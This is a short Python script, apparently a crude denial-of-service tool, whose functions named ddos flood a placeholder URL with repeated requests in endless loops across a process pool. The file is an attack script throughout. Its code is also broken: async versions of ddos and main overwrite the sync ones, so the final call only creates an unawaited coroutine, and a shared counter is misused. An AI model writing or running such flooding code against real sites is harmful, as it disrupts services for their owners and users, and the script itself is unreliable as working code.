import requests
import requests_async as requestsa
from multiprocessing import Pool, Value


url = "http://www.asdfweriouxicuviosdjflk.com/"


def ddos(worker_number: int):
    while True:
        try:
            response = requests.get(url)
            response.raise_for_status()
        except Exception as e:
            print(f"Stopping worker {worker_number}, exception {e}")
            break
        else:
            with total_requests.get_lock():
                total_requests.value += 1
                if total_requests.value % 5 == 0:
                    print(f"Total requests: {total_requests.value}")

async def ddos(worker_number: int):
    while True:
        try:
            response = await requestsa.get(url)
            response.raise_for_status()
        except Exception as e:
            print(f"Stopping worker {worker_number}, exception {e}")
            break
        else:
            with total_requests.get_lock():
                total_requests.value += 1
                if total_requests.value % 5 == 0:
                    print(f"Total async requests: {total_requests.value}")


def init_globals(counter):
    global total_requests
    total_requests = counter


#if __name__ == '__main__':
def main():
    workers = 2
    total_requests = Value("L", 0)
    process_pool = Pool(workers, initializer=init_globals, initargs=(total_requests,))
    process_pool.map(ddos, (number for number in range(workers)))

async def main():
    await ddos(Value("L", 0))

main()
